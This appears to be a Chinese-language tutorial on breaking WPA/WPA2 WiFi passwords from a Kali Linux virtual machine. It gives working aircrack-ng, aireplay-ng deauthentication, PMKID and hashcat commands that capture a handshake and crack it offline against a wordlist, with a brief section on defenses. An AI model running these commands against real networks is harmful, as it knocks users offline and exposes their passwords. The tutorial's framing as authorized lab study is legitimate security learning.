

## 基于VMware中Kali Linux 拦截四次握手包实现对WiFi的破解

## 前言

 本文档记录了在VMware环境中使用 Kali Linux 进行 WPA/WPA2 无线网络安全测试的完整流程。所有操作均在**自己拥有的授权靶机环境**中进行，仅用于学习研究。请勿在未经许可的网络和设备上使用。 

## 一、环境准备

### 1.1 虚拟机与无线网卡

- **虚拟机软件**：VMware Workstation 或 VirtualBox
- **Kali Linux**：最新版（内置 aircrack-ng 套件）
- **外置无线网卡**：虚拟机无法直接使用内置网卡进行监听，需要支持监听模式的 USB 网卡

**推荐芯片**（支持 monitor 模式）

![1775484293880](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775484293880.png)

### 1.2 将网卡连接到虚拟机

- **VMware**：虚拟机 → 可移动设备 → 选择 USB 网卡 → 连接

- **VirtualBox**：需安装扩展包，在 USB 设备中勾选

  验证连接

  ```
  lsusb
  iwconfig
  ```

![1775484456691](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775484456691.png)

这里的wlan0为支持监听功能的外置无线网卡，同时也是网卡的名字

## 二、无线网卡监听模式

### 2.1 启动监听模式

```
sudo airmon-ng start wlan0
```

![1775484560656](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775484560656.png)

当显示monitor mode enabled 表示处于监听状态

### 2.2 关闭干扰进程（可选，一般不影响）

```
sudo airmon-ng check kill
```

### 2.3 恢复网卡正常模式

```
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### 2.4 常见问题：网卡 down

 现象：`iwconfig` 显示 `wlan0` 状态 down，或 `airodump-ng` 提示 `interface wlan0 down` 

解决办法

```
sudo ifconfig wlan0 up
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

## 三、扫描 WiFi 网络

### 3.1 扫描周围网络

```
sudo airodump-ng wlan0
```

![1775484818943](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775484818943.png)

显示信息：

- **BSSID**：路由器 MAC
- **CH**：信道
- **ENC**：加密方式（WPA2 等）
- **ESSID**：网络名称
- **STATION**：连接的客户端 MAC

### 3.2 锁定目标并抓包

选择目标WiFi的MAC地址，对其进行抓包，同时会生成抓包文件（.cap格式）

- `-c` 指定信道
- `-w` 指定输出文件前缀（会自动生成 `.cap` 文件）

```
sudo airodump-ng -c <信道> --bssid <BSSID> -w <输出文件名> wlan0
```



![1775484953906](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775484953906.png)

生成的cap文件

![1775484985253](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775484985253.png)

## 四、抓取 WPA 握手包

### 4.1 原理

WPA/WPA2 四次握手发生在客户端连接或重连时。如果没有客户端活动，可以发送 deauth （即ACK死亡攻击）包强制客户端重连，由于已经连接过的设备会有自动重建连接功能，所以只需要拦截这次成功连接的握手包，然后跑彩虹表既可以实现破解。

### 4.2 发送 deauth 攻击

在另一个终端中执行：

```
sudo aireplay-ng -0 3 -a <AP_BSSID> -c <客户端MAC> wlan0
```

![1775485457210](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775485548741.png)

如图所示，上述过程发动了三次攻击

- `-0 3`：发送 3 个 deauth 包（数字可改，`-0 0` 为无限发送）
- `-a`：目标 AP 的 BSSID
- `-c`：目标客户端的 MAC

### 4.3 确认握手成功

在 `airodump-ng` 界面的右上角会出现：

```
[ WPA handshake: <BSSID> ]
```

![1775485797443](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775485797443.png)

 出现后立即按 `Ctrl+C` 停止抓包。 

### 4.4 验证握手包有效性

```
aircrack-ng /yourpath/capture-01.cap
```

![1775485909039](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775485909039.png)

当这里显示WPA (0 handshake)表示没有发生重连过程，此时这个包是无效的，不能用于破解

![1775486053053](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775486053053.png)

## 五、破解握手包

### 5.1 使用 aircrack-ng（CPU）

通常在 /usr/share/wordlists/会有一个简单的rockyou.txt 可以先用这个试试看。

```
aircrack-ng -w <字典文件> <cap文件>
```

```
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

![1775486565941](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775486565941.png)

如图所示，现在已经开始尝试破解。

当破解成功后会显示KEY FOUND!恭喜你！你已经成功破解WiFi啦

![1775486850206](C:\Users\xiaoli\AppData\Roaming\Typora\typora-user-images\1775486850206.png)

### 5.2 字典文件

Kali 自带 `rockyou.txt`（需解压）：

```5.4 破解原理
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 5.3 破解原理

离线破解：从握手包中提取 SSID、ANonce、SNonce、MAC 等，对每个候选密码计算 PMK → PTK → MIC，与捕获的 MIC 比对。匹配则密码正确。

## 六、常见问题与技巧

### 6.1 信道锁定失败

现象：`airodump-ng` 显示 `fixed channel wlan0: X` 但 AP 在另一信道，或 `RXQ=0`

解决：

bash

```
sudo iwconfig wlan0mon channel <正确信道>
```



或使用 `-c` 参数重新抓包。

### 6.2 无客户端（STATION 为空）

- 等待客户端出现
- 如果是自己的网络，用手机/电脑连接该 WiFi
- 使用 PMKID 攻击（无需客户端，需路由器支持漫游）

PMKID 抓取示例：

bash

```
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
hcxpcaptool -z pmkid.txt capture.pcapng
hashcat -m 16800 pmkid.txt rockyou.txt
```



### 6.3 破解速度慢

- 使用 GPU + hashcat（比 CPU 快数十倍）
- 先跑小字典（如 100w 条）
- 使用规则攻击（hashcat `-r` 参数）

### 6.4 网卡频繁 down

- 确保使用监听接口 `wlan0mon` 而非 `wlan0`
- 避免在抓包时插拔网卡
- 使用社区驱动（如 RTL8821CU 的 morrownr 驱动）

------

## 七、防御措施（知识扩展）

### 7.1 启用 802.11w（管理帧保护）

- 对 deauth 等管理帧加密，防止伪造踢人
- 需要路由器、客户端均支持
- WPA3 默认开启

### 7.2 使用强密码

- 长度 ≥12，包含大小写、数字、特殊符号
- 避免字典中的常见密码

### 7.3 MAC 地址过滤

- 白名单模式：只允许已知设备连接
- 可被 MAC 克隆绕过，但增加攻击难度

### 7.4 关闭 WPS

- WPS PIN 漏洞可被暴力破解，泄露 WiFi 密码

------

## 八、总结

完整的 WiFi 渗透测试流程：

1. **准备**：支持监听模式的 USB 网卡 + Kali 虚拟机
2. **监听**：`airmon-ng start wlan0` → `airodump-ng` 扫描
3. **抓包**：锁定目标信道/BSSID，等待客户端，必要时发送 deauth
4. **验证**：`aircrack-ng` 检查握手包有效性（1 handshake）
5. **破解**：`aircrack-ng` 或 `hashcat` + 字典
6. **分析**：获得密码后，可进一步测试路由器管理后台（仅限授权）

**法律与道德**：所有操作必须在自己拥有或明确授权的网络中进行。未经许可的破解属于违法行为。

------

## 附录：常用命令速查

| 目的              | 命令                                            |
| :---------------- | :---------------------------------------------- |
| 启动监听模式      | `sudo airmon-ng start wlan0`                    |
| 扫描网络          | `sudo airodump-ng wlan0mon`                     |
| 锁定目标抓包      | `sudo airodump-ng -c  --bssid  -w out wlan0mon` |
| 发送 deauth       | `sudo aireplay-ng -0 3 -a  -c  wlan0mon`        |
| 验证握手包        | `aircrack-ng out-01.cap`                        |
| CPU 破解          | `aircrack-ng -w dict.txt out-01.cap`            |
| 转换 hashcat 格式 | `hcxpcapngtool -o out.hc22000 out-01.cap`       |
| GPU 破解          | `hashcat -m 22000 out.hc22000 dict.txt`         |
| 恢复网卡          | `sudo systemctl restart NetworkManager`         |